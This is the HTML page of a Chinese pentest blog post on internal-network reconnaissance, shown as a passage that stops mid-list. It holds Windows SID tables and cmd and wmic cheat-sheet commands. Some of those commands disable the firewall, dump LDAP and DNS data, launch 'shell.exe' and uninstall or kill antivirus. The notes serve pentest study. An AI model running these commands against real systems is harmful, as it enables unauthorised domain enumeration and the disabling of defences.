<!DOCTYPE html><html lang="zh-CN" class="vertical-scrollbar" data-astro-transition-scope="astro-smooz4hq-1"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><meta name="generator" content="Astro v5.16.6"><title>内网信息获取 | Penetration / 内网和域 | 应神上の博客</title><!-- Preconnect to third-party origins for faster resource loading --><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="preconnect" href="https://chinese-font.netlify.app" crossorigin><link rel="dns-prefetch" href="https://chinese-font.netlify.app"><!-- Async load Chinese fonts to avoid render-blocking --><link rel="stylesheet" href="/fonts/ChillRoundFRegular/result.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/fonts/ChillRoundFBold/result.css" media="print" onload="this.media='all'"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.QW52Ox2j.js"></script><style>.astro-loading-indicator {
  pointer-events: none;
  background-color: #e9536a;
  position: fixed;
  z-index: 1031;
  top: 0;
  left: 0;
  width: 100%;
  height: 2px;
  transition: transform 300ms ease-out, opacity 150ms 150ms ease-in;
	transform: translate3d(0, 0, 0) scaleX(var(--progress, 0));
  transform-origin: 0;
}

[dir="rtl"] .astro-loading-indicator {
  transform-origin: 100% 0;
}
</style><script>(function(){const className = "astro-loading-indicator";
const animationDuration = 300;
const threshold = 200;

(() => {
  let progress = 0.25
  let opacity = 0
  /** @type {number | undefined} */
  let trickleInterval = undefined
  /** @type {number | undefined} */
  let thresholdTimeout = undefined;

  const element = document.createElement("div")
  element.classList.add(className)
  element.ariaHidden = "true"

  /** @param {typeof progress} _progress */
  const setProgress = (_progress) => {
    progress = _progress
    element.style.setProperty('--progress', String(progress))
  }

  /** @param {typeof opacity} _opacity */
  const setOpacity = (_opacity) => {
    opacity = _opacity
    element.style.setProperty('opacity', String(opacity))
  }

  setOpacity(opacity)

  document.addEventListener("DOMContentLoaded", () => {
    document.body.prepend(element)
  })

  document.addEventListener("astro:before-preparation", () => {
    thresholdTimeout = setTimeout(() => {
      setOpacity(1)
      trickleInterval = window.setInterval(() => {
        setProgress(progress + Math.random() * 0.03)
      }, animationDuration)
    }, threshold)
  })

  document.addEventListener("astro:before-swap", (ev) => {
    if (!thresholdTimeout) {
      return
    }
    window.clearTimeout(thresholdTimeout)

    ev.newDocument.body.prepend(element)
    window.clearInterval(trickleInterval)
    trickleInterval = undefined

    setProgress(1)
    window.setTimeout(() => {
      setOpacity(0)
    }, animationDuration / 2)

    window.setTimeout(() => {
      setProgress(0.25)
    }, animationDuration * 2)
  })
})()
})();</script><script type="module" src="/_astro/Tooltips.astro_astro_type_script_index_0_lang.Bx2cGmPu.js"></script><!-- metadata --><meta name="description" content="Windows安全标识符SID 临时HTTP服务架设 Cmd"><meta name="author" content="Kaguya"><meta property="og:type" content="website"><meta property="og:site_name" content="Kaguya"><meta property="og:url" content="https://kaguyahi.github.io/blog/post/29/"><meta property="og:title" content="内网信息获取 | Penetration / 内网和域 | 应神上の博客"><meta property="og:description" content="Windows安全标识符SID 临时HTTP服务架设 Cmd"><!-- <meta property="og:image" content="/opengraph.png?v=1" /> TODO: og image--><meta name="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://kaguyahi.github.io/blog/post/29/"><meta name="twitter:title" content="内网信息获取 | Penetration / 内网和域 | 应神上の博客"><meta name="twitter:description" content="Windows安全标识符SID 临时HTTP服务架设 Cmd"><script>
      // 立即执行主题检查 否则会闪烁
      if (
        localStorage.theme === 'dark' ||
        (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
      ) {
        document.documentElement.classList.add('dark');
        document.documentElement.classList.remove('light');
        document.documentElement.dataset.theme = 'dark';
      } else {
        document.documentElement.classList.remove('dark');
        document.documentElement.classList.add('light');
        document.documentElement.dataset.theme = 'light';
      }
    </script><script>
      // iOS Safari pinch-zoom guard (viewport meta alone is not always respected)
      (() => {
        const blockGesture = (event) => event.preventDefault();
        document.addEventListener('gesturestart', blockGesture, { passive: false });
        document.addEventListener('gesturechange', blockGesture, { passive: false });
        document.addEventListener('gestureend', blockGesture, { passive: false });
      })();
    </script><!--主题检查切换对应值--><script type="module" src="/_astro/Layout.astro_astro_type_script_index_0_lang.D2B82Q8W.js"></script><!--FIXED:  SPA主题切换不渲染, tab栏切换变浅色问题。--><script type="module">function e(){localStorage.theme==="dark"||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?(document.documentElement.classList.add("dark"),document.documentElement.classList.remove("light"),document.documentElement.dataset.theme="dark"):(document.documentElement.classList.remove("dark"),document.documentElement.classList.add("light"),document.documentElement.dataset.theme="light")}document.addEventListener("astro:page-load",e);</script><link rel="stylesheet" href="/_astro/about.a1eB78ko.css">
<link rel="stylesheet" href="/_astro/_slug_.D059aVq8.css">
<link rel="stylesheet" href="/_astro/about.DVVP3m5k.css">
<link rel="stylesheet" href="/_astro/index.Lf6pSiPd.css"><script type="module" src="/_astro/page.BKvqMfX1.js"></script><style>[data-astro-transition-scope="astro-smooz4hq-1"] { view-transition-name: root; }@layer astro { ::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(root) { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-smooz4hq-1"],
			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-smooz4hq-1"] { 
	animation-duration: 180ms;
	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
	animation-fill-mode: both;
	animation-name: astroFadeIn; }</style></head> <body> <div class="flex min-h-screen flex-col text-black dark:text-white"> <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var a=(s,i,o)=>{let r=async()=>{await(await s())()},t=typeof i.value=="object"?i.value:void 0,c={rootMargin:t==null?void 0:t.rootMargin},n=new IntersectionObserver(e=>{for(let l of e)if(l.isIntersecting){n.disconnect(),r();break}},c);for(let e of o.children)n.observe(e)};(self.Astro||(self.Astro={})).visible=a;window.dispatchEvent(new Event("astro:visible"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="2g4Pp9" prefix="r11" component-url="/_astro/Header.tY410c8a.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;isPostPage&quot;:[0,true],&quot;tocNumbering&quot;:[0,true],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;windows安全标识符sid&quot;],&quot;text&quot;:[0,&quot;Windows安全标识符SID&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;临时http服务架设&quot;],&quot;text&quot;:[0,&quot;临时HTTP服务架设&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;cmd&quot;],&quot;text&quot;:[0,&quot;Cmd&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi-1&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powershell基础操作&quot;],&quot;text&quot;:[0,&quot;Powershell基础操作&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powerview&quot;],&quot;text&quot;:[0,&quot;Powerview&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;addomain&quot;],&quot;text&quot;:[0,&quot;ADDomain&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;bloodhoundad&quot;],&quot;text&quot;:[0,&quot;BloodHoundAD&quot;]}]]]}" ssr client="visible" opts="{&quot;name&quot;:&quot;Header&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/_astro/logo.Gai7gqE6.webp"/><div id="site-header" class="shadow-text fixed inset-x-0 top-0 z-10 gap-4 py-2.5 text-white select-none tablet:backdrop-blur tablet:py-2 tablet:pl-3 tablet:pr-3" style="view-transition-name:site-header"><div class="site-header-bg pointer-events-none absolute inset-0"></div><div class="relative z-10 mx-auto flex items-center justify-between px-6 tablet:w-full tablet:px-0 max-w-7xl"><a class="tablet:hidden -my-4 mr-4 flex cursor-pointer items-center justify-center gap-1 whitespace-nowrap" href="/" target="_self" title="Kaguya" aria-label="Kaguya" data-astro-transition-persist="page-header-avatar" style="view-transition-name:page-header-avatar"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="mt-2 mb-2 h-16"/></a><div class="tablet:flex w-full h-full tablet:grow hidden items-center justify-center"><a href="/blog" class="flex items-center gap-1"><img src="/_astro/logo.Gai7gqE6.webp" alt="Kaguya" class="h-8" height="32"/></a></div><div class="tablet:grow-0 flex grow items-center" style="view-transition-name:page-header"><div class="tablet:hidden flex grow items-center gap-4"><a href="/blog" aria-label="文章" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章</a><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a><a href="/blog/archives" aria-label="归档" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-solid fa-flag" aria-hidden="true"></i>归档</a><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap rounded-md ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 px-4 py-2 relative text-base tracking-wider after:absolute after:bottom-1 after:left-1/2 after:block after:h-0.5 after:w-0 after:-translate-x-1/2 after:transition-all after:duration-300 hover:after:w-9/12"><i class="mr-1.5 fa-solid fa-user" aria-hidden="true"></i>关于</a></div><div class="ml-auto flex items-center gap-2"><button id="search-trigger" class="group cursor-pointer transition duration-300 hover:scale-125" aria-label="搜索" title="搜索 (⌘K)"><i class="fa-solid fa-magnifying-glass text-2xl" aria-hidden="true"></i></button><div id="search-component-portal" style="display:none;position:absolute;pointer-events:none;visibility:hidden"><div id="search-for-dialog" class="pagefind-ui" data-pagefind-ui="true"></div></div><style>
        .scroll-feather-mask {
          container-type: scroll-state;
        }
        @container scroll-state(scrollable: bottom) {
          .scroll-feather-mask::before {
            content: '';
            background: linear-gradient(
              to bottom,
              transparent 0%,
              var(--gradient-bg-start) var(--scroll-mask-middle, 70%),
              var(--gradient-bg-start) var(--scroll-mask-end, 100%)
            );
            position: absolute;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 10;
            display: block;
            height: var(--scroll-mask-height, 5rem);
          }
        }
      </style><button class="theme-toggle text-2xl cursor-pointer bg-transparent border-0 p-0 transition-transform duration-300 hover:scale-110" id="theme-toggle-btn" type="button" aria-label="toggle theme" aria-pressed="false"><i class="fa-solid fa-sun text-2xl light-icon transition-all duration-300" style="opacity:1;transform:rotate(0deg) scale(1)"></i><i class="fa-solid fa-moon text-2xl dark-icon transition-all duration-300" style="opacity:0;transform:rotate(-180deg) scale(0)"></i></button><style>
        .theme-toggle {
          position: relative;
          z-index: 10;
          width: 36px;
          height: 36px;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .theme-toggle i {
          position: absolute;
          text-shadow: none;
          filter: none;
        }
      </style></div></div></div></div><!--astro:end--></astro-island> <main class="relative flex grow flex-col gap-4">   <div class="flex flex-col"> <div class="relative flex h-[60dvh] max-h-200 overflow-hidden"> <div class="absolute inset-0 h-full bg-black/40"></div> <div class="absolute inset-0 bottom-[8dvh] flex flex-col items-center justify-center px-5 text-white">  <h1 class="shadow-text word-break text-4.5xl text-center font-bold md:text-2xl max-w-7xl flex flex-wrap items-center justify-center gap-3"> 内网信息获取  </h1> <p class="mt-3 flex items-center justify-center gap-4 md:text-xs"> <span class="flex items-center gap-1"> <i class="fa-regular fa-calendar-days" aria-hidden="true"></i>
发表于 2026-01-23 </span> <span class="flex items-center gap-1"> <i class="fa-solid fa-pen-nib" aria-hidden="true"></i> 2458 字
</span> <span class="flex items-center gap-1"> <i class="fa-regular fa-clock" aria-hidden="true"></i> 13 min read </span> </p> </div> <div class="relative -z-10 h-full min-h-60 w-full" data-astro-transition-persist="page-cover-banner" id="banner-box" style="background-image:linear-gradient(135deg, #ccd1cb 0%, #c0bbaa 50%, #c4ad96 100%)"> <img src="/img/backgrounds/imgi_3_CE1106989.webp" alt="cover" class="h-full w-full object-cover" sizes="50vw"> </div> <div class="wave-wrap"><svg class="wave" xmlns="http://www.w3.org/2000/svg" viewBox="0 24 150 28" preserveAspectRatio="none"><defs><path id="gentle-wave" d="m -160,44.4 c 30,0 58,-18 87.7,-18 30.3,0 58.3,18 87.3,18 30,0 58,-18 88,-18 30,0 58,18 88,18 l 0,34.5 -351,0 z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="50" y="0" fill="rgba(255, 255, 255, 0.48)"></use><use xlink:href="#gentle-wave" x="50" y="3" fill="rgba(255, 255, 255, 0.78)"></use><use xlink:href="#gentle-wave" x="50" y="6" fill="rgba(255, 255, 255, 0.8)"></use></g></svg></div> </div> <div class="mx-auto md:mx-0 flex w-full items-start justify-center md:w-full max-w-7xl"> <div class="page-home-sider shadow-home-sider sticky top-0 self-start flex min-w-64 max-w-64 flex-col tablet:hidden overflow-hidden h-screen min-h-0 items-center px-2" transition:name="page-home-sider"> <script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).load=e;window.dispatchEvent(new Event("astro:load"));})();</script><astro-island uid="1yHeP7" prefix="r10" component-url="/_astro/HomeSiderPanel.Kcih-vV4.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/avatar.webp&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,29],&quot;categoryCount&quot;:[0,7],&quot;tagCount&quot;:[0,40],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;]}],[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}],[0,{&quot;name&quot;:[0,&quot;归档&quot;],&quot;path&quot;:[0,&quot;/blog/archives&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-solid fa-flag&quot;]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/29/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;windows安全标识符sid&quot;],&quot;text&quot;:[0,&quot;Windows安全标识符SID&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;临时http服务架设&quot;],&quot;text&quot;:[0,&quot;临时HTTP服务架设&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;cmd&quot;],&quot;text&quot;:[0,&quot;Cmd&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi-1&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powershell基础操作&quot;],&quot;text&quot;:[0,&quot;Powershell基础操作&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powerview&quot;],&quot;text&quot;:[0,&quot;Powerview&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;addomain&quot;],&quot;text&quot;:[0,&quot;ADDomain&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;bloodhoundad&quot;],&quot;text&quot;:[0,&quot;BloodHoundAD&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/内网和域/内网常用命令&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;内网信息获取&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;内网信息&quot;],[0,&quot;信息收集&quot;],[0,&quot;命令&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;body&quot;:[0,&quot;# Windows安全标识符SID\n\n| 相对标识符 | 说明            |\n| ----- | ------------- |\n| 500   | 管理员           |\n| 501   | 来宾            |\n| 502   | 密钥分发中心服务的服务账户 |\n| 512   | 域管理员          |\n| 513   | 域用户           |\n| 514   | 域来宾           |\n| 515   | 域计算机          |\n| 516   | 域控制器          |\n| 544   | 内置管理员         |\n| 519   | 企业管理员         |\n# 临时HTTP服务架设\n```\npython2 -m SimpleHTTPServer \npython3 -m http.server 8080\nphp -S 0.0.0.0:8888\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -key key.pem -cert cert.pem -accept 443 –WWW\nruby -rwebrick -e \&quot;WEBrick::HTTPServer.new(:Port = 8888,:DocumentRoot = Dir.pwd).start\&quot;\nruby -run -e httpd . -p 8888\n```\n# Cmd\n\n```\nwhoami /user 查看当前用户SID\nnet config Workstation 查看当前计算机信息\nnet time /domain 判断主域\n错误5：存在域，当前不是域用户\n显示时间：存在域，当前是域内用户\n找不到域：不存在\nnet view /domain 列出域列表\nnet group \&quot;Domain Controllers\&quot; /domain查看主域控\nnltest /DCLIST:zone.com 查看域控\nnet group \&quot;domain admins\&quot; /domain 查看域管理员\nnet group \&quot;enterprise admins\&quot; /domain 查看企业管理员列表\nnet localgroup administrators /domain 查看管理组用户\nnet group \&quot;domain computers\&quot; /domain 查看域成员计算机\nnet accounts /domain 查看密码策略\nnet user /domain查看域内用户\nnet view /domain:dc 查询域内计算机\nnetsh firewall set opmode disable/enable 关闭windows防火墙(win2003)\nnetsh advfirewall set allprofiles state off/on(大于win2003)\narp -a查看arp表\nnet start 查看服务\nroute print查看路由表\nquery user查看登录机器的用户的连接状态\ntasklist /v 查看域管理员进程\ndsquery server查询域控制器\ndsquery computer 查询域内机器\ndsquery user 查询域用户\ndsquery ou 域内组织单位\n导出域DNS记录，文件保存在C:\\Windows\\System32\\dns\\\ndnscmd /zoneexport zone.com 1.txt\n导出LDAP数据库\nLDIFDE -f c:\\windows\\temp\\dump.ldf -n -m\n```\n# Wmi\n\n```\nwmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本\nwmic service list brief 列出本机服务\nwmic process list brief 列出进程\nwmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径\nwmic process get caption,commandline /value1.txt查询所有进程参数\nwmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数\n创建进程\nwmic process call create calc\nwmic process call create \&quot;C:\\shell.exe\&quot;\nwmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;\n结束进程\nwmic process where name=\&quot;shell.exe\&quot; call terminate\nwmic process where processid=\&quot;2345\&quot; delete\nwmic process 2345 call terminate\nwmic startup list brief 列出自启动程序\nwmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件\nwmic netuse list brief 列出共享驱动盘\nwmic ntdomain list brief 查询域控制器\nwmic useraccount list brief 列出本机管理员及SID\nwmic qfe list brief 列出补丁列表\nwmic share get name,path 查看共享\nwmic startup list brief查看启动项\nwmic product get name,version 查看安装的软件\nwmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名\nwmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序\nwmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名\nwmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序\nwmic desktop get screensaversecure,screensavertimeout 查看屏保\n```\n# Wmi\n\n```\nwmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本\nwmic service list brief 列出本机服务\nwmic process list brief 列出进程\nwmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径\nwmic process get caption,commandline /value1.txt查询所有进程参数\nwmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数\n创建进程\nwmic process call create calc\nwmic process call create \&quot;C:\\shell.exe\&quot;\nwmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;\n结束进程\nwmic process where name=\&quot;shell.exe\&quot; call terminate\nwmic process where processid=\&quot;2345\&quot; delete\nwmic process 2345 call terminate\nwmic startup list brief 列出自启动程序\nwmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件\nwmic netuse list brief 列出共享驱动盘\nwmic ntdomain list brief 查询域控制器\nwmic useraccount list brief 列出本机管理员及SID\nwmic qfe list brief 